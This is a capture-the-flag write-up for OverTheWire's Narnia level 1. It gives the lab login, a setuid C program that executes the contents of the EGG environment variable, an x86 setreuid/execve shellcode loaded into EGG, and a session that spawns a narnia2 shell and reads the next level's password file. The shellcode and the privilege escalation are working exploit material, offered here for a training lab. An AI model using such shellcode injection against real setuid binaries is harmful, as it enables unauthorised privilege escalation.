

Log in into the game:
```bash
ssh narnia1@narnia.labs.overthewire.org -p 2226 # password efeidiedae
```

Code of `/narna/narnia1.c`:
```bash
/*
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
#include <stdio.h>

int main(){
	int (*ret)();

	if(getenv("EGG")==NULL){    
		printf("Give me something to execute at the env-variable EGG\n");
		exit(1);
	}

	printf("Trying to execute EGG!\n");
	ret = getenv("EGG");
	ret();

	return 0;
}

```
It seems code's getting stored in memoery (refer to https://github.com/Alpackers/CTF-Writeups/tree/master/Misc/OverTheWire/Narnia/Narnia1).
Using a exploit (from http://shell-storm.org/shellcode/files/shellcode-399.php):

```bash
export EGG=$(python -c 'print "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"')
```

```bash
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ ls
narnia0    narnia1.c  narnia3	 narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2    narnia3.c  narnia5    narnia6.c  narnia8
narnia1    narnia2.c  narnia4	 narnia5.c  narnia7    narnia8.c
$ cat /etc/narnia_pass/narnia2
nairiepecu

```

Useful setuid explanation https://stackoverflow.com/questions/10496153/setreuid-call-fails-to-re-establish-process-permissions?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa.
